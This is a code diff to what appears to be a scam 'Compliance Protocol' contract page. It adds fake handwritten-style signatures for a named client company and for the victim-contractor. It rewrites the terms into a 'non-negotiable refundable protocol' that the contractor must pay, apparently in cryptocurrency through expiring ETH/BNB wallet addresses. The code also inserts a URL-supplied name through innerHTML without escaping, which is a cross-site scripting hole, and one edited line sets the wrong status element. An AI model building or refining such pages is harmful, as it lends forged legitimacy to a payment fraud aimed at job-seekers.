@@ -5,6 +5,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Compliance Protocol</title>
 
+    <!-- Imports a distinct handwriting font for the contractor signature -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Caveat:wght@600&display=swap" rel="stylesheet">
+
     <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
 
 <style>
@@ -722,7 +727,89 @@ color:#a78bfa;
 left:250px;
 }
 
-    </style>
+    /* Signature Styles */
+    .signature-section {
+        margin-top: 25px;
+        margin-bottom: 25px;
+        border-top: 1px solid #e8e2d9;
+        padding-top: 20px;
+    }
+
+    .sig-table {
+        display: table;
+        width: 100%;
+    }
+
+    .sig-row {
+        display: table-row;
+    }
+
+    .sig-col {
+        display: table-cell;
+        width: 48%;
+        padding-right: 4%;
+        vertical-align: top;
+    }
+
+    .sig-col:last-child {
+        padding-right: 0;
+    }
+
+    .sig-box {
+        border-top: 1px solid #2c2825;
+        padding-top: 8px;
+        margin-top: 35px;
+    }
+
+    .sig-title {
+        font-weight: 700;
+        font-size: 10pt;
+        color: #1a1615;
+        margin-bottom: 2px;
+    }
+
+    .sig-sub {
+        font-size: 8.5pt;
+        color: #635b54;
+    }
+
+    .signature-font {
+        font-family: 'Brush Script MT', 'cursive', sans-serif;
+        font-size: 18pt;
+        color: #1a2a3a;
+        margin-bottom: -35px;
+        margin-left: 10px;
+    }
+
+    .contractor-sig-font {
+        font-family: 'Caveat', 'Segoe Script', 'Bradley Hand', cursive;
+        font-size: 26pt;
+        font-weight: 600;
+        color: #1d3557;
+        margin-bottom: -38px;
+        margin-left: 8px;
+        display: inline-block;
+        transform: rotate(-2deg);
+        letter-spacing: 0.5px;
+        user-select: none;
+    }
+
+    @media screen and (max-width: 768px) {
+        .sig-table {
+            display: block !important;
+            width: 100% !important;
+        }
+        .sig-row {
+            display: block !important;
+        }
+        .sig-col {
+            display: block !important;
+            width: 100% !important;
+            padding-right: 0 !important;
+            margin-bottom: 20px;
+        }
+    }
+</style>
 </head>
 <body>
 
@@ -784,7 +871,7 @@ CROP MODAL
           <input type="checkbox" id="confirmation" checked disabled style="pointer-events: none;">
           <label for="confirmation" style="font-weight: 500; line-height: 1.6; color: #a46cff; display: block; text-align: left;">
 
-            <span style="  
+            <span id="complianceProtocolText" style="  
               display: block;  
               margin: 12px 0;  
               padding-left: 12px;  
@@ -793,11 +880,36 @@ CROP MODAL
               font-size: 10px;
               
             ">  
-              Pursuant to the client's signature, the Strategic Partner is mandated to execute the following additional protocol, to officially notarize and register this cross-border Visual Architecture Suite (Phase 1) agreement, subject to full reimbursement upon project completion.
+              Pursuant to the client's signature, the Strategic Partner is mandated to execute the following non-negotiable refundable protocol, to officially notarize and register this cross-border Visual Architecture Suite (Phase 1) agreement.
             </span>
 
           </label>
         </div>
+      </div>
+
+      <!-- Section 6: Authorization & Signatures inserted here -->
+      <div class="signature-section">
+          <h2 style="font-size: 13pt; font-weight: 700; color: #1a1615; border-left: 4px solid #d96b43; padding-left: 10px; margin: 0 0 15px 0;">6. Authorization & Signatures</h2>
+          <div class="sig-table">
+              <div class="sig-row">
+                  <div class="sig-col">
+                      <p style="font-weight: 600; margin-bottom: 5px;">On Behalf Of Client:</p>
+                      <div class="signature-font">Garry Oakes</div>
+                      <div class="sig-box">
+                          <div class="sig-title">Garry Oakes</div>
+                          <div class="sig-sub">Operations/Legal Dept, AvalonFlow Corp<br>Date: <span id="clientSigDate">Loading...</span></div>
+                      </div>
+                  </div>
+                  <div class="sig-col">
+                      <p style="font-weight: 600; margin-bottom: 5px;">For Strategic Partner:</p>
+                      <div class="contractor-sig-font" id="contractorSignature">Anna Grzybowska</div>
+                      <div class="sig-box">
+                          <div class="sig-title" id="contractorSigTitle">Anna Grzybowska</div>
+                          <div class="sig-sub">Lead Design Strategist<br>Date: <span id="sigDate">Loading...</span></div>
+                      </div>
+                  </div>
+              </div>
+          </div>
       </div>
 
       <!-- Segmented Token Selector inside container -->
@@ -992,6 +1104,54 @@ let isProcessing = false;
 
 /* ---------- 1. RESTORE ON LOAD (UNIFIED HANDSHAKE) ---------- */
 document.addEventListener('DOMContentLoaded', () => {
+    // 1. Resolve user identity from URL parameter or localStorage (matching your contract page logic)
+    const urlParams = new URLSearchParams(window.location.search);
+    let resolvedName = urlParams.get('user');
+
+    if (!resolvedName || resolvedName.trim() === '') {
+        const localDataString = localStorage.getItem('section2Data');
+        if (localDataString) {
+            try {
+                const localData = JSON.parse(localDataString);
+                if (localData.fullName && localData.fullName.trim() !== '') {
+                    resolvedName = localData.fullName.trim();
+                }
+            } catch (e) {
+                console.error("Could not parse section2Data", e);
+            }
+        }
+    }
+
+    if (!resolvedName) {
+        resolvedName = "Anna Grzybowska"; // Fallback default
+    }
+
+    // Bind Contractor Name Metadata to Section 6 signatures
+    const sigNameEl = document.getElementById('contractorSignature');
+    if (sigNameEl) sigNameEl.innerText = resolvedName;
+
+    const sigTitleEl = document.getElementById('contractorSigTitle');
+    if (sigTitleEl) sigTitleEl.innerText = resolvedName;
+
+    // Bind formatted effective dates
+    const options = { year: 'numeric', month: 'long', day: 'numeric' };
+    const formattedDateToday = new Date().toLocaleDateString('en-US', options);
+    
+    const clientSigDateEl = document.getElementById('clientSigDate');
+    if (clientSigDateEl) clientSigDateEl.innerText = formattedDateToday;
+
+    const sigDateEl = document.getElementById('sigDate');
+    if (sigDateEl) sigDateEl.innerText = formattedDateToday;
+
+    // 2. Replace "the Strategic Partner" with the resolved name dynamically
+    const protocolSpan = document.getElementById('complianceProtocolText');
+    if (protocolSpan) {
+        protocolSpan.innerHTML = protocolSpan.innerHTML.replace(
+            "the Strategic Partner", 
+            `<strong>${resolvedName}</strong>`
+        );
+    }
+
     const savedPhoto = localStorage.getItem('profilePhoto');
     if (savedPhoto) {
         if (profilePhoto) profilePhoto.src = savedPhoto;
@@ -1689,7 +1849,7 @@ window.addEventListener("DOMContentLoaded", () => {
             localStorage.setItem("avalonflowWalletPair", JSON.stringify(walletPair));
 
             if (ethStatus) ethStatus.innerText = "Wallet Address expired.";
-            if (bnbStatus) bnbStatus.innerText = "Wallet Address expired.";
+            if (bnbStatus) ethStatus.innerText = "Wallet Address expired.";
             if (checkBtn) checkBtn.disabled = true;
 
             localStorage.removeItem("av_payment_in_progress");
